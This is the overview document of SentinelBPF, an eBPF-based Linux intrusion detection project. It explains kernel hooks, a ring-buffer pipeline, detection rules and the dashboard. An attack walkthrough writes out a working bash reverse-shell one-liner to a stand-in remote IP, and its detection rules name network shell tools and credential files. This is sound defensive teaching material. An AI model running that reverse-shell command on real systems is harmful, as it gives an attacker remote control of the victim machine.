# SentinelBPF: Project Overview

**A detailed explanation of what the project is, why it exists, how it works, and where it stands.**

This document is written for readers who are new to the project: instructors, teammates, reviewers, or anyone preparing a report or viva. For build and run instructions see `README.md`; for the developer-level design see `PROPOSED_SOLUTION.md`; for current progress see `PROJECT_STATUS_REPORT.md`.

> **Accuracy note.** Where this document describes behavior that has not yet been tested on a real kernel, it says so. See [Section 18](#18-current-project-status).

---

## Table of Contents

1. [The Project in One Paragraph](#1-the-project-in-one-paragraph)
2. [The Problem It Addresses](#2-the-problem-it-addresses)
3. [Background Concepts](#3-background-concepts)
4. [What SentinelBPF Does](#4-what-sentinelbpf-does)
5. [How It Works: An Attack Walkthrough](#5-how-it-works-an-attack-walkthrough)
6. [Architecture](#6-architecture)
7. [The Event Model](#7-the-event-model)
8. [Detection Rules](#8-detection-rules)
9. [Process Lineage and Container Awareness](#9-process-lineage-and-container-awareness)
10. [Daemon Internals](#10-daemon-internals)
11. [API and WebSocket Interface](#11-api-and-websocket-interface)
12. [The Dashboard](#12-the-dashboard)
13. [Configuration](#13-configuration)
14. [Technology Stack and Why](#14-technology-stack-and-why)
15. [Operating System Concepts Demonstrated](#15-operating-system-concepts-demonstrated)
16. [Security Considerations and Limitations](#16-security-considerations-and-limitations)
17. [How It Compares to Existing Tools](#17-how-it-compares-to-existing-tools)
18. [Current Project Status](#18-current-project-status)
19. [Repository Layout](#19-repository-layout)
20. [Running It](#20-running-it)
21. [Roadmap](#21-roadmap)
22. [Glossary](#22-glossary)
23. [Frequently Asked Questions](#23-frequently-asked-questions)

---

## 1. The Project in One Paragraph

SentinelBPF is a **host intrusion detection system (HIDS)** for Linux. It uses **eBPF** to watch important system calls and scheduler events inside the kernel (program execution, network connections, file opens, process tracing, user-ID changes, mounts), sends compact event records to a user-space daemon through a **ring buffer**, and evaluates those events against **detection rules** (such as "a shell whose input and output are wired to a network socket", which is the signature of a reverse shell). Alerts, a live process tree, and event metrics are streamed over **WebSockets** to a web dashboard. Events are tagged with **cgroup and namespace** information so activity can be traced back to the container it came from.

SentinelBPF **detects and alerts**. It does not block or kill anything.

---

## 2. The Problem It Addresses

Attackers who gain a foothold on a Linux machine typically do a small number of recognizable things:

- run a shell that connects back to their server (a **reverse shell**)
- edit sensitive files such as `/etc/shadow` or `/etc/sudoers`
- try to become root
- run programs from writable temp directories such as `/tmp`
- if inside a container, try to **escape** to the host

Traditional ways of noticing these have drawbacks:

| Approach | Drawback |
| :--- | :--- |
| Polling `/proc` or running `ps` periodically | Misses short-lived processes that start and exit between polls |
| Parsing log files | Logs are written by the attacker's target, may be incomplete, and arrive late |
| Kernel modules | Powerful, but a bug can crash the whole system |
| Heavy user-space agents | Extra CPU and context switching |

**eBPF** offers another route: small, **verified** programs run safely inside the kernel at the exact moment an event happens, so nothing is missed and the kernel cannot be crashed by the monitoring code itself. SentinelBPF applies that idea to a focused set of attack patterns, and presents the results in an easy-to-read live dashboard.

---

## 3. Background Concepts

You do not need to be an eBPF expert to follow the project. These are the ideas it relies on.

### 3.1 eBPF

eBPF lets you load small programs into the Linux kernel. Before a program runs, the kernel's **verifier** checks it: it must terminate, must not access invalid memory, and must only call approved helper functions. If it fails the check, it is rejected. This gives kernel-level visibility without the risk of a crashing kernel module.

### 3.2 Tracepoints and hooks

A **tracepoint** is a stable, named instrumentation point in the kernel, for example "a process is about to call `openat`" (`sys_enter_openat`). An eBPF program can attach to it and run each time it fires. SentinelBPF uses **BTF-enabled raw tracepoints** (`tp_btf`) for `sched_process_exec` (process execution), giving type-safe access to kernel structures; `sched_process_fork` and `sched_process_exit` use plain tracepoints.

### 3.3 Maps and the ring buffer

eBPF programs communicate through **maps**, which are kernel data structures shared with user space (hash tables, arrays, and so on). The **ring buffer** (`BPF_MAP_TYPE_RINGBUF`) is a map designed for streaming events from kernel to user space efficiently. The daemon reads events from it by mapping the same memory, avoiding extra copies.

### 3.4 CO-RE and BTF

Kernel data structures change between versions. **BTF** (BPF Type Format) is metadata describing the running kernel's types. **CO-RE** (Compile Once, Run Everywhere) uses that metadata to adjust field accesses at load time, so one compiled program works across many kernel versions. This is why the project needs a kernel with `/sys/kernel/btf/vmlinux`.

### 3.5 Namespaces and cgroups

Containers are built from Linux **namespaces** (isolated views of PIDs, mounts, network) and **cgroups** (resource grouping). Each process belongs to a mount namespace and a cgroup. SentinelBPF records both for each event, which lets it say "this happened inside container X" and detect "a process in a non-host mount namespace is calling `mount`".

---

## 4. What SentinelBPF Does

| Capability | Description |
| :--- | :--- |
| **Kernel-level event capture** | Hooks process fork/exec/exit, `connect`, `openat`, `dup2/dup3`, `ptrace`, `setuid`, `mount` |
| **Early, cheap filtering** | The kernel side drops obviously irrelevant events (for example, file opens with no write flags) to reduce load |
| **Rule-based detection** | A user-space rule engine correlates events over time and raises alerts with severity levels |
| **Process lineage** | Maintains a live tree of parent/child processes from fork, exec and exit events |
| **Container awareness** | Tags events with cgroup ID and namespace IDs to identify the originating container |
| **Live dashboard** | Real-time alerts, event log, process tree and metrics in the browser |
| **Backpressure handling** | A slow browser must never slow the kernel event reader; the hub drops or disconnects slow clients instead |
| **Mock mode** | A synthetic event generator lets the daemon and dashboard be demonstrated on machines without eBPF (clearly labeled as simulation) |

---

## 5. How It Works: An Attack Walkthrough

The clearest way to understand SentinelBPF is to follow one attack from start to finish.

**Scenario:** an attacker with code execution runs
```bash
bash -i >& /dev/tcp/203.0.113.5/4444 0>&1
```
This starts an interactive shell and connects its input and output to a remote machine.

**Step by step:**

1. **`connect`.** Bash opens a TCP socket (say, file descriptor 3) and calls `connect()` to `203.0.113.5:4444`.
   The `sys_enter_connect` eBPF program fires, reads the destination address and port, and writes a `CONNECT` event to the ring buffer (with PID, UID, cgroup, namespace IDs and the socket fd).

2. **`dup`.** Bash redirects its standard input, output and error to that socket by calling `dup2`/`dup3` so that file descriptors 0, 1 and 2 now point at the socket.
   The `sys_enter_dup3` program fires. The kernel-side filter keeps only duplications onto fd 0 to 2, so it writes a `DUP` event (old fd 3, new fd 1).

3. **Daemon receives events.** The daemon's ring buffer reader drains events and passes them through a buffered channel to the process table and the rule engine.

4. **Rule engine correlates.** The reverse-shell rule keeps per-process state:
   - On `CONNECT` to a non-allowlisted address, it remembers "fd 3 is a suspicious socket".
   - On `DUP` from fd 3 onto fd 0/1/2, it flags "stdio is now wired to a suspicious socket".
   - If the process is a shell (or later executes one), it **raises a CRITICAL alert**.

5. **Alert delivered.** The alert is enriched with process and container information and sent through the hub to every connected dashboard over a WebSocket.

6. **Dashboard shows it.** A CRITICAL alert appears, and the process shows in the tree with its parent chain.

Why not just alert on "a shell made a network connection"? Many legitimate tools connect to the network. The signature of a reverse shell is the **combination** of a network connection and standard I/O being redirected to it, which is why the rule is stateful and why this logic lives in user space and not inside the kernel program.

---

## 6. Architecture

```
KERNEL SPACE
  Hooks:  sched_process_exec     (tp_btf)
          sched_process_fork     (tracepoint)
          sched_process_exit     (tracepoint)
          sys_enter_{connect,openat,dup2,dup3,ptrace,setuid,mount}   (tracepoints)
              |
  eBPF programs: filter + enrich (pid, ppid, uid, euid, cgroup id, namespace ids)
              |
  BPF ring buffer  (+ "drops" counter, "ignored_pids" map)
----------------------------------------------------------------------------------
USER SPACE   (sentinel-daemon, written in Go)
  ring buffer reader -> decoder -> process table
                                 -> container resolver
                                 -> rule engine -> alerts
                                         |
                                  hub (fan-out, batching, backpressure)
                                     |                      |
                                 WebSocket               HTTP API
----------------------------------------------------------------------------------
BROWSER
  Next.js / React dashboard:  alerts, event log, process tree (D3), metrics (ECharts)
```

**Design principle:** keep the kernel side small and simple; do stateful and policy-driven work in user space. This keeps the eBPF programs verifier-friendly and keeps rules easy to change without recompiling.

| Component | Responsibility |
| :--- | :--- |
| eBPF programs (C) | Capture events, apply cheap filters, attach context, write to the ring buffer |
| Loader (Go) | Load programs, attach hooks, configure maps |
| Ring buffer reader | Drain events quickly; never does slow work |
| Process table | Track processes and parent/child relationships |
| Container resolver | Map cgroup IDs to container identifiers |
| Rule engine | Evaluate rules with per-process state, raise de-duplicated alerts |
| Hub | Fan out events and alerts to dashboard clients with backpressure control |
| API server | HTTP endpoints and WebSocket upgrade |
| Dashboard | Visualize everything in real time |

---

## 7. The Event Model

Every captured event uses a single fixed-size C structure shared between kernel and user space. In the current design it is **480 bytes**, 8-byte aligned, with no hidden padding, so the Go daemon can decode it directly.

Key fields:

| Field | Meaning |
| :--- | :--- |
| `ts_ns` | Monotonic timestamp in nanoseconds |
| `cgroup_id` | cgroup v2 ID of the process (maps to a container) |
| `type` | Event type (fork, exec, exit, connect, open, dup, ptrace, setuid, mount) |
| `pid`, `tid`, `ppid` | Process, thread and parent IDs |
| `uid`, `euid` | Real and effective user IDs |
| `mnt_ns`, `net_ns` | Mount and network namespace identifiers |
| `arg0`, `arg1` | Type-dependent values (fd, flags, target PID, requested UID) |
| `family`, `port`, `addr4`, `addr6` | Network address details for `connect` |
| `comm` | Short process name (up to 16 characters) |
| `path`, `path2` | File or executable path; mount target |

**Why the effective UID?** Programs like `passwd` run with root privileges through the setuid bit even when a normal user starts them. Using `euid` for "is this root?" checks avoids false alarms from such legitimate tools.

**Why `sched_process_exec` for execution?** It fires only on a *successful* exec and gives the kernel's own copy of the filename. Syscall-entry hooks read argument memory that another thread could change after the read, so the scheduler hook is more reliable for exec detection.

---

## 8. Detection Rules

Rules are implemented in Go (`internal/rules`) and configured in `config.yaml`.

| Rule | What it looks for | Severity |
| :--- | :--- | :--- |
| **Reverse shell** | A process connects to a non-allowlisted address, redirects stdin/stdout/stderr (fd 0 to 2) onto that socket, and is (or becomes) a shell or an interpreter such as `python`, `perl`, `nc`, `socat` | CRITICAL |
| **Sensitive file tampering** | A process with non-root effective UID opens a protected path (`/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/etc/ld.so.preload`, `/etc/pam.d`, `/etc/crontab`) with write flags | HIGH |
| **Privilege escalation indicators** | `setuid(0)` attempts by non-root processes; setuid binary monitoring | HIGH |
| **Process injection** | `ptrace` attach/seize against another user's process | HIGH |
| **Unauthorized mount / container breakout** | `mount` called from a process in a non-host mount namespace | CRITICAL |
| **Execution from volatile paths** | Programs started from `/tmp`, `/dev/shm`, `/var/tmp` | MEDIUM |

Notes:

- The first five correspond to sections in the current `config.yaml`. The volatile-path rule appears in the design but has no config section in the current file; confirm its status in the code.
- An alert means a process **attempted** something. System-call-entry hooks fire before the permission check, so a write to `/etc/shadow` by an unprivileged user will raise an alert even though the kernel then refuses it. That is intentional: attempts are interesting.
- **Alert cooldown** (default 10 seconds per rule, process and key) prevents one noisy process from flooding the dashboard.
- **Allowlists** (for example `passwd`, `useradd`, `chsh`) reduce false positives from legitimate administration tools.

---

## 9. Process Lineage and Container Awareness

### Process lineage

The daemon builds a live tree of processes from three event types:

- **fork:** a new child appears under its parent
- **exec:** the process image changed (new executable path)
- **exit:** the node is marked exited and removed after a short grace period

At startup it scans `/proc` so processes that already exist show up in the tree. When a parent exits, the kernel reparents its children (usually to PID 1); the table follows that.

Lineage matters because it turns an isolated alert into a story: for example `sshd -> bash -> python -> sh` with the last `sh` connected to an external address.

### Container awareness

On cgroup v2, the cgroup ID returned by the kernel equals the inode number of the process's cgroup directory under `/sys/fs/cgroup`. The daemon builds a map from those IDs to paths, extracts the container ID (the 64-hex identifier used by Docker and Kubernetes layouts), and shows the first 12 characters.

For container breakout detection, the daemon compares an event's mount namespace against the host's. A `mount` call from a different mount namespace is suspicious.

Container tagging needs **cgroup v2**.

---

## 10. Daemon Internals

### Pipeline

```
ring buffer -> reader goroutine -> buffered channel -> processor
                                                         |-> process table
                                                         |-> rule engine -> alerts
                                                         |-> hub -> clients
```

### Rules for the reader

The ring buffer reader must **never block or do slow work** (no JSON encoding, disk, or network inside it). If the reader falls behind, the kernel cannot reserve space and events are dropped. Two drop counters are tracked: kernel-side (ring buffer full) and user-side (channel full).

### Hub and backpressure

Each dashboard client gets a bounded send queue. If a client is slow:

1. Non-alert messages for that client are dropped and counted.
2. Alerts are not dropped before events.
3. Persistently stalled clients are disconnected.

The principle: **a slow browser tab must never slow down the detection pipeline.**

### Self-exclusion

The daemon inserts its own PID into an `ignored_pids` map so it does not trace itself and flood the stream.

### Mock mode

`--mock` replaces the kernel reader with a synthetic generator that emits scripted attack-like events (for example a reverse shell to a reserved documentation address and a write attempt on `/etc/shadow`). It allows the daemon, rules, API and dashboard to be demonstrated on machines without eBPF. It does not test the kernel side, and the UI is meant to show a visible **SIMULATION** indicator so fake events cannot be mistaken for real detections.

---

## 11. API and WebSocket Interface

Verified from the current code (`internal/api/server.go`):

| Route | Purpose | Authentication |
| :--- | :--- | :--- |
| `GET /health`, `GET /api/v1/health` | Liveness | None |
| `GET /api/v1/status` | Daemon status | Token (if configured) |
| `GET /api/v1/alerts` | Recent alerts | Token (if configured) |
| `GET /api/v1/processes` | Process tree | Token (if configured) |
| `GET /api/v1/process/<pid>` | Single process detail | Token (if configured) |
| `GET /ws`, `GET /api/v1/ws` | WebSocket stream | Origin check; token if configured |

**Security defaults:** the server binds to `127.0.0.1`; WebSocket origins are checked against an allowlist (`http://localhost:3000` and similar); an optional bearer token protects the API when `auth_token` is set. An empty token disables authentication, which is acceptable only for local use.

**WebSocket messages** (per the design; confirm field names in `internal/api`): a `hello` on connect, a `snapshot` of current processes and recent alerts, batched `events`, immediate `alert` messages, process updates, and periodic `metrics` (events per second, drops, daemon resource use).

---

## 12. The Dashboard

Built with Next.js and React, with D3.js for the process tree and Apache ECharts for metrics.

| View | What it shows |
| :--- | :--- |
| **Alert feed** | Severity-colored alerts; critical alerts stand out |
| **Event log** | A scrolling, filterable log of raw events (by type, PID, command, container) |
| **Process tree** | Parent/child hierarchy, with alerting processes highlighted and container badges |
| **Metrics** | Events per second by type, alert counts, drop counters |
| **Connection status** | Whether the WebSocket is connected, with automatic reconnect |

Design choices for responsiveness: incoming messages are buffered and flushed to the screen at a limited rate (about 5 to 10 times per second), history is bounded, and long lists are virtualized, so a burst of events cannot freeze the page.

---

## 13. Configuration

`config.yaml` (excerpt of the current schema):

```yaml
server:
  host: "127.0.0.1"
  port: 8080
  auth_token: ""                 # empty = auth disabled
  allowed_origins:
    - "http://localhost:3000"
    - "http://127.0.0.1:3000"

bpf:
  ring_buffer_size: 16777216     # bytes, power of two (16 MB)
  event_buffer_size: 65536       # user-space channel capacity

rules:
  treat_loopback_as_external: false
  alert_cooldown_seconds: 10
  reverse_shell:        { enabled: true, connection_timeout_seconds: 30, shell_binaries: [...] }
  privilege_escalation: { enabled: true, monitor_setuid_binaries: true }
  file_tampering:       { enabled: true, sensitive_paths: [...], allowlisted_binaries: [...] }
  process_injection:    { enabled: true }
  unauthorized_mount:   { enabled: true }
```

`treat_loopback_as_external: true` is for demos on a single machine, so connections to `127.0.0.1` count as external. Leave it `false` for real use.

---

## 14. Technology Stack and Why

| Layer | Technology | Reason |
| :--- | :--- | :--- |
| Kernel programs | C with libbpf and CO-RE | Standard way to write portable eBPF |
| Daemon | Go with `cilium/ebpf` | Pure-Go eBPF loader, strong concurrency (goroutines and channels), simple deployment as one binary |
| Binding generation | `bpf2go` | Generates Go types and loaders from the compiled eBPF object |
| Transport | WebSockets (`gorilla/websocket`) | Low-latency push to the browser |
| Frontend | Next.js, React, TypeScript | Component model and type safety |
| Visualization | D3.js, Apache ECharts | Custom tree layout and streaming charts |
| Build | Make, clang/LLVM, bpftool | Compile eBPF and generate kernel type headers |

---

## 15. Operating System Concepts Demonstrated

| OS concept | Where it appears in SentinelBPF |
| :--- | :--- |
| **Kernel vs user space** | eBPF programs run in the kernel; the daemon and dashboard run outside it; the ring buffer bridges them |
| **System calls** | The tool traces `connect`, `openat`, `dup2/dup3`, `ptrace`, `setuid`, `mount` |
| **Process management** | Fork/exec/exit lifecycle, PIDs and TGIDs, parent/child trees, reparenting, `task_struct` fields |
| **Scheduling hooks** | `sched_process_fork/exec/exit` tracepoints |
| **File descriptors and VFS** | Open flags (`O_WRONLY`, `O_CREAT`), `dup` onto fd 0 to 2, sockets as file descriptors |
| **Permissions and credentials** | Real vs effective UID, setuid binaries, privilege escalation |
| **Memory and data structures** | BPF maps, shared-memory ring buffer, bounded memory access enforced by the verifier |
| **Concurrency and synchronization** | Goroutines, channels, backpressure, lock-light event paths |
| **Namespaces and cgroups** | Container isolation and identification |
| **Inter-process communication** | Kernel/user shared memory; WebSocket between daemon and browser |
| **Security and isolation** | Verifier-enforced safety, least privilege, TOCTOU limitations |

---

## 16. Security Considerations and Limitations

SentinelBPF is a monitoring tool, so honesty about what it cannot do matters.

**Limitations**

- **Detection only.** Events are observed, not prevented. A fast attacker is not stopped.
- **Syscall-argument race (TOCTOU).** Syscall-entry hooks read user-space memory (such as file paths). A multithreaded process can change that memory after it is read, so paths can be spoofed. Using the scheduler `exec` hook mitigates this for execution; the long-term fix is LSM hooks (see roadmap).
- **Attempt, not outcome.** Hooks fire before the result is known; an alert does not prove success.
- **Path matching.** Relative paths, symlinks and bind mounts can evade simple string comparison unless resolved. Directory entries (such as `/etc/pam.d`) need prefix logic.
- **Event loss.** If the ring buffer fills, events are dropped; drop counters expose this.
- **Compromised host.** An attacker with root or kernel control can detach the programs or blind the tool.
- **False positives.** Legitimate administration tools can look like attacks; allowlists and cooldowns reduce but do not remove them.
- **Fd tracking gaps.** The reverse-shell rule does not track `close`, and does not cover `fcntl(F_DUPFD)` duplication.
- **Scope.** Five attack families are covered, not full ATT&CK coverage.

**Security of the tool itself**

- It runs with elevated privileges (root, or `CAP_BPF` and `CAP_PERFMON`).
- The API binds to localhost by default, checks WebSocket origins, and supports a bearer token.
- Process names and paths shown in the dashboard may be sensitive.

**Safe testing:** demonstrations should run in a disposable VM or WSL2 environment. The reverse-shell test must stay on loopback.

---

## 17. How It Compares to Existing Tools

| Tool | Approach | Relationship to SentinelBPF |
| :--- | :--- | :--- |
| **auditd** | Kernel audit subsystem plus log files | Mature and widely deployed, but log-oriented and heavier to correlate; SentinelBPF gives live structured events and a UI |
| **Falco** | Syscall/eBPF-based runtime security with a rules language | Production-grade and far broader; SentinelBPF is a focused, educational implementation of the same idea |
| **Tetragon / Tracee** | eBPF security observability (Tetragon can also enforce) | Similar technology, much more extensive; SentinelBPF shows the core pieces end to end |
| **osquery** | Queries OS state with SQL, periodic | Great for inventory and state; polling-based, so can miss short-lived processes |

SentinelBPF is **not** meant to replace these. Its value is as a complete, understandable reference implementation: kernel probes, event pipeline, rule engine, API and visualization in one project.

---

## 18. Current Project Status

*(Snapshot from `PROJECT_STATUS_REPORT.md` Revision 2. Check that file for the latest state.)*

| Area | Status |
| :--- | :--- |
| Development environment | WSL2 Ubuntu 24.04, kernel 6.18 with BTF, cgroup v2 and syscall tracepoints present |
| eBPF C code | Written; compiles with `clang -target bpf` (exit 0). **Not yet loaded into a kernel; verifier has not run** |
| Go daemon | Written; `go vet` clean; unit tests pass for api, config, container, events, proctable, rules |
| Hub (backpressure) | **Known bug:** `TestHubStalledClientDoesNotBlock` fails; fix pending |
| Build system | Manual `bpf2go` command works; `make build-ebpf` is broken and pending a fix |
| Mock mode | Daemon runs and raises simulated alerts |
| API routes | Confirmed in code (`/health`, `/api/v1/*`, `/ws`); earlier docs listed wrong paths |
| Dashboard | Built; **not yet verified against a running daemon** |
| Real detection on live syscalls | **Not yet verified** |
| Demo scripts | Written; never run |
| Benchmarks | **Not measured**; no performance claims should be made yet |

---

## 19. Repository Layout

```
SentinelBPF/
├── bpf/
│   ├── sentinel.h             shared event struct (480 bytes)
│   ├── sentinel.bpf.c         eBPF programs
│   └── vmlinux.h              generated from kernel BTF (not committed)
├── cmd/sentinel-daemon/       daemon entry point (--config, --mock)
├── internal/
│   ├── bpf/                   loader, mock reader, generated bindings
│   ├── events/                event decoding
│   ├── proctable/             process tree
│   ├── container/             cgroup to container resolver
│   ├── rules/                 detection rules
│   ├── hub/                   WebSocket fan-out and backpressure
│   ├── api/                   HTTP and WebSocket server
│   └── config/                configuration loading and validation
├── web-ui/                    Next.js dashboard
├── scripts/                   safe demo scripts
├── config.yaml
├── Makefile
├── README.md                  user-facing overview and run instructions
├── PROPOSED_SOLUTION.md       developer design document
├── PROJECT_OVERVIEW.md        this document
├── PROJECT_STATUS_REPORT.md   progress and known issues
├── AGENTS.md                  rules for AI coding agents
└── NEXT_STEPS_FOR_AGENT.md    current task list
```

---

## 20. Running It

Details are in `README.md`. In short, on Linux or WSL2 (kernel 5.8+ with BTF):

```bash
make all                                      # build eBPF object, bindings and daemon
./bin/sentinel-daemon --config config.yaml --mock     # simulation, no root
sudo ./bin/sentinel-daemon --config config.yaml       # real kernel monitoring
cd web-ui && npm install && npm run dev       # dashboard at http://localhost:3000
```

Use a disposable VM or WSL2 for the real mode and for demos.

---

## 21. Roadmap

| Item | Why |
| :--- | :--- |
| **eBPF LSM hooks (`bpf_lsm`)** | Move from detection to enforcement, and remove the argument race |
| **`sys_exit_*` hooks** | Confirm success or failure of `connect`, `setuid` and others |
| **Baseline anomaly detection** | Flag unusual syscall rates or sequences per process |
| **XDP** | Early network filtering for scans and flood protection |
| **Rule hot-reload and standard rule formats** | Change rules without restarting; share rules |
| **Persistent audit log** | JSON-lines log of alerts for later analysis |
| **Multi-host aggregation** | Collect alerts from many machines |

---

## 22. Glossary

| Term | Meaning |
| :--- | :--- |
| **HIDS** | Host-based Intrusion Detection System: monitors one machine for attacks |
| **eBPF** | Mechanism for running verified programs inside the Linux kernel |
| **Verifier** | Kernel component that checks an eBPF program for safety before it runs |
| **Tracepoint** | A named, stable instrumentation point in the kernel |
| **Ring buffer** | Shared-memory queue for sending events from kernel to user space |
| **BPF map** | Kernel data structure shared between eBPF programs and user space |
| **BTF** | Type metadata describing the running kernel's data structures |
| **CO-RE** | "Compile Once, Run Everywhere": portable eBPF across kernel versions |
| **Syscall** | A request from a user program to the kernel (open a file, connect, and so on) |
| **TOCTOU** | Time-of-check to time-of-use race: data changes between being read and being used |
| **Reverse shell** | A shell on a victim machine that connects out to the attacker |
| **File descriptor (fd)** | Integer handle to an open file or socket; 0, 1, 2 are stdin, stdout, stderr |
| **UID / EUID** | Real and effective user ID; EUID decides privileges in effect |
| **Namespace** | Isolated view of a system resource (PIDs, mounts, network) used by containers |
| **cgroup** | Kernel mechanism to group processes and limit resources; used to identify containers |
| **WSL2** | Windows Subsystem for Linux 2: a lightweight Linux VM on Windows |
| **Backpressure** | Handling a slow consumer without slowing the producer |

---

## 23. Frequently Asked Questions

**Q: Why use eBPF instead of a kernel module?**
A: eBPF programs are checked by the verifier before they run, so they cannot crash the kernel or access arbitrary memory. A buggy kernel module can bring the whole system down.

**Q: Why is the rule logic in user space and not in the kernel?**
A: Correlating several events over time (connect, then dup, then exec) needs state and flexible logic. Keeping it in user space keeps the kernel programs small and verifier-friendly, and lets rules change without recompiling.

**Q: Is this "zero overhead"?**
A: No. The overhead is low by design (early filtering, a shared-memory ring buffer), but it has not been measured yet, so no number should be quoted until benchmarks are run.

**Q: Does it block attacks?**
A: No. It detects and alerts only. Blocking would need LSM hooks, which are on the roadmap.

**Q: Why might an alert fire even when the attack failed?**
A: Hooks run at syscall entry, before the kernel decides whether the call succeeds. For example, an unprivileged `touch /etc/shadow` is refused, but the attempt is still logged.

**Q: Why use the effective UID?**
A: Setuid programs such as `passwd` run as root even when launched by a normal user. Using real UID would flag them wrongly.

**Q: What happens if the dashboard is slow or disconnected?**
A: The hub drops non-alert messages for that client and may disconnect it. Detection and other clients are unaffected.

**Q: What does mock mode prove?**
A: That the daemon, rule engine, API and dashboard work with synthetic events. It does not prove that the kernel programs load or capture real events.

**Q: Why does it need kernel BTF and cgroup v2?**
A: BTF enables CO-RE portability; cgroup v2 lets cgroup IDs map cleanly to container directories.

**Q: What are the main weaknesses?**
A: Syscall-argument races, detection after the fact, path-matching gaps, event loss under extreme load, and no protection against an attacker who already controls the kernel. See Section 16.

**Q: Can it run on Windows?**
A: The dashboard and the mock daemon can; real monitoring needs Linux. On Windows 11 use WSL2 with a kernel that has BTF and tracepoints.
